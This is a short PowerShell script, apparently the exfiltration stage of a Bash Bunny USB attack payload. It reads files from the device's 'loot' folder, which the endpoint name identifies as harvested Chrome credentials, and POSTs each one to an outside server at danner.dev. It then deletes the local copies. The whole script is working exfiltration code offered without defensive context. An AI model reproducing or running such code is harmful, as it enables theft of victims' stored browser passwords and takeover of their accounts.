if(Test-Connection -ComputerName google.com -Quiet) {
	$lootPath =  ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\loot\')
	$children = Get-ChildItem $lootPath
	if(($children | Measure-Object).Count -ne 0) {
		foreach ($child in $children) {
			$webRequest = Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body (Get-Content ($lootPath + $child)) -ContentType "application/json"
			if ($webRequest.StatusCode -eq 200) {
				Remove-Item -path ($lootPath + $child)
				Write-Host ("Uploaded document. Status Code: " + $webRequest.StatusCode)
			} else {
				Write-Host ("ERROR: Cannot post to the API! Error Code: " + $webRequest.StatusCode)
			}
		}
	} else {
		Write-Host "Folder is empty. Exiting."
	}
} else {
	Write-Host "Please make sure you are online. It appears you are offline."
}